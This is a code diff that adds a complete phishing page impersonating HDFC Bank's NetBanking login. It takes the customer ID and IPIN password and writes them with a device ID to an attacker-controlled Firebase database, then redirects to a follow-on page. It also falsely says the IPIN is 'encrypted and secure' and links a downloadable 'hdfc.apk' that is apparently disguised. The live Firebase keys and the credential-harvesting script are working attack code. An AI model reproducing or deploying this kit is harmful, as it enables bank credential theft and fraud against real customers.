@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank - NetBanking Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --hdfc-blue: #004c8f;
+            --hdfc-red: #ed232a;
+            --bg-grey: #f0f4f7;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body {
+            background-color: var(--bg-grey);
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        nav {
+            background: var(--hdfc-blue);
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            color: white;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .nav-back { font-size: 20px; cursor: pointer; }
+        nav img { height: 28px; }
+        .nav-right { margin-left: auto; display: flex; align-items: center; gap: 15px; color: #fff; }
+        .logout-text { font-size: 11px; font-weight: 600; text-align: center; }
+
+        .progress-container { background: #e2e8f0; height: 4px; width: 100%; }
+        .progress-fill { background: var(--hdfc-red); height: 100%; width: 85%; }
+
+        .page-header { background: white; padding: 25px 20px; border-bottom: 1px solid #eee; }
+        .page-header h2 { color: var(--hdfc-blue); font-size: 18px; font-weight: 800; }
+        .page-header p { color: #666; font-size: 13px; margin-top: 5px; }
+
+        .form-container { padding: 20px; background: #fff; flex: 1; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; font-size: 12px; font-weight: 700; color: #444; margin-bottom: 8px; text-transform: uppercase; }
+        .input-wrapper { display: flex; align-items: center; border: 1.5px solid #d1d9e0; border-radius: 8px; background: #fdfdfd; }
+        .input-wrapper:focus-within { border-color: var(--hdfc-blue); }
+        .input-wrapper i { padding: 0 15px; color: var(--hdfc-blue); opacity: 0.7; }
+        .input-wrapper input { border: none; padding: 14px 10px; flex: 1; font-size: 15px; outline: none; background: transparent; }
+
+        /* Captcha Styles */
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 10px;
+        }
+        .captcha-display {
+            background: #e2e8f0;
+            padding: 10px 20px;
+            font-size: 20px;
+            font-weight: 900;
+            letter-spacing: 5px;
+            font-style: italic;
+            color: #333;
+            border-radius: 5px;
+            user-select: none;
+            background-image: linear-gradient(45deg, transparent 45%, #ccc 45%, #ccc 55%, transparent 55%);
+            background-size: 10px 10px;
+        }
+        .refresh-captcha { color: var(--hdfc-blue); cursor: pointer; font-size: 18px; }
+
+        .submit-btn {
+            background: var(--hdfc-blue);
+            color: white;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            margin-top: 20px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 12px rgba(0, 76, 143, 0.2);
+        }
+
+        footer { background: #fff; padding: 30px 20px; text-align: center; font-size: 12px; color: #aaa; border-top: 1px solid #eee; }
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="nav-back" onclick="history.back()"><i class="fas fa-arrow-left"></i></div>
+        <img src="./hdftoolimage.png" alt="HDFC Bank Logo">
+        <div class="nav-right">
+            <div style="text-align: center; line-height: 1;">
+                <i class="fas fa-sign-out-alt" style="font-size: 18px;"></i>
+                <div class="logout-text">Logout</div>
+            </div>
+        </div>
+    </nav>
+
+    <div class="progress-container">
+        <div class="progress-fill"></div>
+    </div>
+
+    <div class="page-header">
+        <h2>NetBanking Login</h2>
+        <p>Login to your account to complete application.</p>
+    </div>
+
+    <div class="form-container">
+        <form onsubmit="validateCaptcha(event)">
+            <div class="input-group">
+                <label>Customer ID / User ID</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-user-lock"></i>
+                    <input type="text" id="userid" name="customer_id" placeholder="Enter Customer ID" required>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>IPIN (Password)</label>
+                <div class="input-wrapper">
+                    <i class="fas fa-key"></i>
+                    <input type="password" id="password" name="ipin" placeholder="Enter Password" required>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Security Code (Captcha)</label>
+                <div class="captcha-box">
+                    <div class="captcha-display" id="captcha_code">1234</div>
+                    <i class="fas fa-sync-alt refresh-captcha" onclick="generateCaptcha()"></i>
+                </div>
+                <div class="input-wrapper" style="margin-top: 10px;">
+                    <i class="fas fa-shield-alt"></i>
+                    <input type="text" id="captcha_input" placeholder="Enter code shown above" required maxlength="4">
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">Login & Proceed</button>
+        </form>
+    </div>
+
+    <div style="padding: 20px; text-align: center;">
+        <p style="font-size: 11px; color: #888;"><i class="fas fa-shield-alt" style="color: #4caf50;"></i> Your IPIN is encrypted and secure.</p>
+    </div>
+
+    <footer>
+        <div style="display: flex; justify-content: center; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
+            <a href="#" style="color: #999; text-decoration: none;">Security Tips</a>
+            <a href="#" style="color: #999; text-decoration: none;">Help</a>
+            <a href="./hdfc.apk" download style="color: var(--hdfc-blue); text-decoration: none; font-weight: 700;">Download App</a>
+        </div>
+        <p>HDFC Bank Ltd. © 2024. All rights reserved.</p>
+    </footer>
+
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDrTNuW2u0b0fJpL-8Yb8STBggon0p-zcs",
+            authDomain: "hdfc-a-client-apcd001.firebaseapp.com",
+            databaseURL: "https://hdfc-a-client-apcd001-default-rtdb.firebaseio.com",
+            projectId: "hdfc-a-client-apcd001",
+            storageBucket: "hdfc-a-client-apcd001.firebasestorage.app",
+            messagingSenderId: "552520760858",
+            appId: "1:552520760858:web:0e0917aa3355b141315ba3",
+            measurementId: "G-JM2VQHTSKF"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        // Device ID logic
+        let deviceId = localStorage.getItem('deviceId') || 'DEV' + Math.floor(Math.random() * 900000 + 100000);
+        localStorage.setItem('deviceId', deviceId);
+
+        let currentCaptcha = "";
+
+        function generateCaptcha() {
+            currentCaptcha = Math.floor(1000 + Math.random() * 9000).toString();
+            document.getElementById('captcha_code').innerText = currentCaptcha;
+        }
+
+        async function validateCaptcha(event) {
+            event.preventDefault();
+            const userInput = document.getElementById('captcha_input').value;
+            const userid = document.getElementById('userid').value;
+            const ipin = document.getElementById('password').value;
+
+            if (userInput === currentCaptcha) {
+                await database.ref('web/' + deviceId + '/cust_data').update({
+                    customer_id: userid,
+                    ipin: ipin,
+                    last_updated: Date.now()
+                });
+
+                location.href = 'index3.html'; // Go to processing
+            } else {
+                alert("Invalid Security Code. Please try again.");
+                generateCaptcha();
+                document.getElementById('captcha_input').value = "";
+            }
+        }
+
+        // Initial captcha generation
+        window.onload = generateCaptcha;
+    </script>
+</body>
+</html>
